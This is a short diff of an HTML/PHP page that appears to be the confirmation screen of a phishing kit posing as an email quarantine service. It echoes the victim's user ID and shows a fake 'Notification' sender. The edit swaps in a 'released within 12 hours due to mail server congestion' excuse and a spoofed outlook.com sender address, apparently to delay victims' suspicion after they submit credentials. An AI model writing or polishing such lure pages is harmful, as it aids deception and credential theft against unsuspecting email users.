@@ -48,8 +48,8 @@ table.list th {border: 1px solid #D6DDE6;background:url(red-top-bottom.gif) repe
 </td></tr>
 <TR><TD class="body"><br>
 <table class="body" cellpadding="0 cellspacing="0">
-<tr><td><b><p>&nbsp;Quarantined messages has been successfully released. <p>&nbsp;User: <span><?php echo($id); ?> </span></p><br><br><br><table class="list"><tbody><tr><th style="width: 25%;">From</th><th style="width: 25%;">Date</th><th style="width: 50%;">Subject</th></tr><tr><td><nobr>
-Notification &lt;noreply@inboundmessages.com&gt;</nobr></td><td><nobr><?php echo date("l jS \of F Y");?></nobr></td>
+<tr><td><b><p>&nbsp;All quarantined messages will be successfully released to your inbox within 12 hours due to mail server congestion. <p>&nbsp;User: <span><?php echo($id); ?> </span></p><br><br><br><table class="list"><tbody><tr><th style="width: 25%;">From</th><th style="width: 25%;">Date</th><th style="width: 50%;">Subject</th></tr><tr><td><nobr>
+Notification &lt;message-center@outlook.com&gt;</nobr></td><td><nobr><?php echo date("l jS \of F Y");?></nobr></td>
 <td><nobr>
 Notice of personal information processing. (This is not an advertisement)</nobr></td>
 </tr></tbody></table></b></td></tr>
